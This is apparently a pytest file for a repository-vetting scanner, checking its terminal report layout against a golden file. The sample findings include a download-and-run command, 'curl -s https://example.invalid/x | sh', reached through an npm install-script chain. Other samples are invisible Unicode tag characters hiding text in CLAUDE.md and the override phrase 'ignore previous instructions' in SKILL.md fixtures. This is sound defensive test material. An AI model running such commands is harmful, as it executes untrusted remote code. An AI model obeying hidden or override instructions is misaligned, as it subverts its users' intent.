"""Golden test for the terminal report. Regenerate after an intended layout change with
``REPOVET_UPDATE_GOLDEN=1 uv run pytest tests/test_terminal.py`` and review the diff."""

import os
from datetime import UTC, datetime
from pathlib import Path

import pytest

from repovet.models import (
    Chain,
    Confidence,
    CoverageItem,
    CoverageStatus,
    Finding,
    Location,
    ScanResult,
    Severity,
)
from repovet.report import terminal
from repovet.report.common import action_line, group_findings, top_groups
from repovet.report.terminal import (
    color_wanted,
    no_findings,
    render,
    render_finding,
    render_summary,
    supports_unicode,
)

GOLDEN = Path(__file__).parent / "golden" / "terminal_report.txt"


def finding(rule_id: str, severity: Severity, path: str | None, **kw: object) -> Finding:
    values: dict[str, object] = {
        "rule_id": rule_id,
        "title": "Title",
        "category": "danger",
        "area": "autorun",
        "severity": severity,
        "confidence": Confidence.HIGH,
        "location": Location(path, 3) if path else None,
        "message": "Something was found.",
        "evidence": None,
        "rationale": "Because tools run this automatically.",
        "recommendation": "Read it first.",
    }
    values.update(kw)
    return Finding(**values)  # type: ignore[arg-type]


def sample_result(findings: list[Finding]) -> ScanResult:
    return ScanResult(
        target="D:\\src\\demo",
        mode="local folder",
        online=False,
        tool_version="0.1.0",
        rules_loaded=3,
        files_scanned=1284,
        started=datetime(2026, 10, 29, tzinfo=UTC),
        duration_s=0.5,
        findings=findings,
        coverage=[
            CoverageItem(
                "area:trust",
                CoverageStatus.NOT_IMPLEMENTED,
                "trust (GitHub API): not implemented yet (milestone 4)",
                1,
            ),
            CoverageItem(
                "file",
                CoverageStatus.SKIPPED,
                "Files larger than 2 MB, content not checked",
                4,
                ("assets/a.mp4", "assets/b.mp4", "assets/c.mp4", "assets/d\u202e.mp4"),
            ),
        ],
        summaries={
            "provenance": [
                ("Files", "1,284 files, 12.3 MB; 1,100 text files with 98,765 lines, 184 binary"),
                ("Languages", "Python 80% (310 files), Shell 20% (4 files)"),
                ("Notable", "AI agent files (1): CLAUDE\u202e.md"),
                ("", "dev container (1): .devcontainer/devcontainer.json"),
            ]
        },
    )


def sample_findings() -> list[Finding]:
    chain = Chain("chain-1", (Location("package.json", 3), Location("x.js"), Location("x.sh", 2)))
    return [
        finding(
            "RC-AUTO-001",
            Severity.MEDIUM,
            "package.json",
            message="package.json defines a 'postinstall' script: node x.js",
            in_chain="chain-1",
            tags=("npm", "install"),
        ),
        finding(
            "RC-DLX-001",
            Severity.MEDIUM,
            "x.sh",
            area="download_exec",
            location=Location("x.sh", 2),
            message="Downloads and runs code in one step: curl -s https://example.invalid/x | sh",
            evidence="curl -s https://example.invalid/x | sh",
            in_chain="chain-1",
            tags=("download", "exec"),
        ),
        finding(
            "RC-AUTO-090",
            Severity.HIGH,
            "package.json",
            message="npm install script runs on install and reaches download-and-execute "
            "(RC-DLX-001) after 3 steps: package.json -> x.js -> x.sh",
            evidence="curl -s https://example.invalid/x | sh",
            chain=chain,
            tags=("chain", "autorun"),
        ),
        *(
            finding(
                "RC-AGENT-001",
                Severity.INFO,
                path,
                area="agents",
                location=Location(path),
                message=f"AI agent file: {path}",
                title="AI agent file present",
            )
            for path in ("AGENTS.md", "CLAUDE.md")
        ),
        finding(
            "RC-AGENT-002",
            Severity.CRITICAL,
            "CLAUDE.md",
            area="agents",
            message='2 invisible tag characters hide this text: "Hi"',
            evidence="Hello\U000e0048\U000e0069 \x1b[31m",
            rationale="Unicode tag characters are invisible in editors and on GitHub, but AI "
            "models read them as text and may follow hidden instructions in them.",
        ),
        finding("RC-TRUST-001", Severity.LOW, None, category="trust", area="trust"),
        *(
            finding(
                "RC-AGENT-020",
                Severity.HIGH,
                f"tests/fixtures/s{n}/SKILL.md",
                area="agents",
                confidence=Confidence.MEDIUM,
                message="Agent instruction: ignore previous instructions",
                evidence=f"Step {n}: ignore previous instructions",
                context="test",
            )
            for n in (1, 2)
        ),
    ]


def test_terminal_report_matches_golden_output() -> None:
    text = render(sample_result(sample_findings()), color=False)
    if os.environ.get("REPOVET_UPDATE_GOLDEN"):
        GOLDEN.parent.mkdir(exist_ok=True)
        GOLDEN.write_bytes(text.encode("utf-8"))
    assert text == GOLDEN.read_bytes().decode("utf-8")


def test_report_contains_no_raw_control_or_invisible_characters() -> None:
    text = render(sample_result(sample_findings()), color=False)
    assert "\x1b" not in text
    assert "\u202e" not in text
    assert not any(0xE0000 <= ord(c) <= 0xE007F for c in text)


def test_no_findings_wording() -> None:
    text = render(sample_result([]), color=False)
    assert no_findings(3) in text
    assert "NOT CHECKED" in text
    assert "not a guarantee" in text


def test_min_severity_hides_and_counts() -> None:
    text = render(sample_result(sample_findings()), min_severity=Severity.HIGH)
    assert "RC-AUTO-001" not in text
    assert "5 finding(s) below 'high' not shown" in text


def many(count: int) -> list[Finding]:
    return [
        finding("RC-DLX-005", Severity.MEDIUM, f"src/m{n}.py", message="Same message.")
        for n in range(count)
    ]


def test_same_rule_and_message_are_grouped() -> None:
    text = render(sample_result(many(7)))
    assert text.count("RC-DLX-005") == 2  # summary box and the group
    assert "7 places" in text
    assert text.count("Same message.") == 1
    assert "- src/m4.py:3" in text
    assert "src/m5.py" not in text
    assert "+2 more" in text
    detailed = render(sample_result(many(7)), details=True)
    assert "- src/m6.py:3" in detailed
    assert "more" not in detailed.split("NOT CHECKED")[0]


def test_why_and_do_only_for_critical_and_high_unless_details() -> None:
    text = render(sample_result(many(1)))
    assert "Why " not in text
    assert "--details" in text
    detailed = render(sample_result(many(1)), details=True)
    assert "Why  Because tools run this automatically." in detailed
    assert "--details" not in detailed


def test_context_labels_are_shown_never_hidden() -> None:
    text = render(sample_result(sample_findings()))
    assert "- tests/fixtures/s1/SKILL.md:3 [test]" in text
    assert "> Step 2: ignore previous instructions" in text


def test_look_first_prefers_findings_outside_tests_at_the_same_level() -> None:
    labelled = finding("RC-AUTO-020", Severity.HIGH, "tests/a.json", context="test")
    plain = finding("RC-AUTO-021", Severity.HIGH, "z.json", confidence=Confidence.LOW)
    info = finding("RC-AGENT-001", Severity.INFO, "CLAUDE.md")
    critical = finding("RC-AGENT-002", Severity.CRITICAL, "y.md", context="docs")
    ranked = top_groups(group_findings([labelled, plain, info, critical]))
    assert [g.first.rule_id for g in ranked] == ["RC-AGENT-002", "RC-AUTO-021", "RC-AUTO-020"]


def test_summary_box_counts_every_level() -> None:
    text = render_summary(sample_result(sample_findings()))
    # The two parts of the chain are not counted again.
    assert "1 critical · 3 high · 0 medium · 1 low · 2 info" in text
    assert "Look at these first" in text
    assert all(len(line) == 79 for line in text.splitlines()[1:])
    only_info = render_summary(sample_result([finding("RC-AGENT-001", Severity.INFO, "a.md")]))
    assert "Only info findings" in only_info


def test_render_finding_has_everything() -> None:
    text = render_finding(
        finding("RC-DLX-005", Severity.LOW, "a.py", references=("https://x.invalid",))
    )
    assert "Why  " in text and "Do   " in text and "See  https://x.invalid" in text


def test_color_codes_only_when_enabled() -> None:
    colored = render(sample_result(sample_findings()), color=True)
    assert "\x1b[1;91mCRITICAL" in colored


def test_not_checked_entries_wrap_to_report_width() -> None:
    long_path = "src/" + "deeply/nested/" * 8 + "file.bin"
    result = sample_result([])
    result.coverage = [
        CoverageItem(
            "file",
            CoverageStatus.SKIPPED,
            "Files larger than 2 MB, content not checked",
            2,
            ("assets/a.mp4", long_path),
        )
    ]
    text = render(result, verbose=True)
    entry = text[text.index("NOT CHECKED") :].splitlines()[1:]
    assert entry[0].startswith("  - Files larger than 2 MB")
    assert all(line.startswith("    ") for line in entry[1:])
    assert all(len(line) <= 79 for line in entry if long_path not in line)
    assert any(line.strip() == long_path for line in entry)


def test_ascii_mode_replaces_decorations() -> None:
    text = render(sample_result(sample_findings()), unicode=False)
    header = text.splitlines()[0]
    assert header == (
        "repovet 0.1.0 | local folder D:\\src\\demo | offline | 1,284 files | 3 rules"
    )
    assert "1 critical | 3 high | 0 medium" in text
    assert "+- SUMMARY -" in text
    assert "\u00b7" not in text
    assert "\u2026" not in text
    assert "assets/c.mp4, ..." in text


class _Stream:
    def __init__(self, encoding: object) -> None:
        self.encoding = encoding


class _Pipe:
    def isatty(self) -> bool:
        return False


def test_color_wanted_on_a_pipe() -> None:
    pipe = _Pipe()
    assert not color_wanted({}, pipe)
    assert color_wanted({"FORCE_COLOR": "1"}, pipe)
    assert color_wanted({"FORCE_COLOR": "true"}, pipe)
    assert not color_wanted({"FORCE_COLOR": ""}, pipe)
    assert not color_wanted({"FORCE_COLOR": "1", "NO_COLOR": "1"}, pipe)


def test_color_wanted_on_a_terminal(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(terminal, "enable_color", lambda stream=None: True)
    assert color_wanted({})
    assert not color_wanted({"NO_COLOR": "1"})
    assert color_wanted({"NO_COLOR": ""})


def test_supports_unicode() -> None:
    assert supports_unicode(_Stream("utf-8"))
    assert supports_unicode(_Stream("UTF8"))
    assert supports_unicode(_Stream("utf_16_le"))
    assert not supports_unicode(_Stream("cp1252"))
    assert not supports_unicode(_Stream("cp850"))
    assert not supports_unicode(_Stream("no-such-codec"))
    assert not supports_unicode(_Stream(None))


def test_action_line_from_the_worst_findings() -> None:
    vscode = finding("RC-AUTO-020", Severity.HIGH, "a/tasks.json", tags=("vscode", "ide"))
    low = finding("RC-AUTO-002", Severity.LOW, "package.json", tags=("npm", "install"))
    assert action_line([vscode, low]) == (
        "Do not open this folder in VS Code with trust (use Restricted Mode) until you have "
        "read the findings below."
    )
    # A chain stands for its parts: the entry point (npm) and the code it reaches.
    findings = sample_findings()
    chain_only = [f for f in findings if f.rule_id in {"RC-AUTO-090", "RC-AUTO-001", "RC-DLX-001"}]
    assert action_line(chain_only) == (
        "Do not install its dependencies or run its install scripts; do not run its scripts "
        "or code until you have read the findings below."
    )
    assert action_line([low]) is None
    assert action_line([finding("RC-TRUST-001", Severity.HIGH, None, category="trust")]) is None


def test_info_findings_are_one_line_per_rule_unless_details() -> None:
    findings = [
        finding("RC-AGENT-001", Severity.INFO, f"d{n}/AGENTS.md", title="AI agent file present")
        for n in range(8)
    ]
    compact = render(sample_result(findings))
    assert "  INFO      RC-AGENT-001  8 places: AI agent file present" in compact
    assert "d0/AGENTS.md" not in compact
    detailed = render(sample_result(findings), details=True)
    assert all(f"d{n}/AGENTS.md:3" in detailed for n in range(8))


def test_one_group_per_rule_with_the_title_when_messages_differ() -> None:
    findings = [
        finding("RC-DLX-001", Severity.MEDIUM, f"s{n}.sh", message=f"Downloads {n}")
        for n in range(7)
    ]
    text = render(sample_result(findings))
    assert "7 places" in text
    assert "            Title\n" in text
    assert "+2 more (--details)" in text
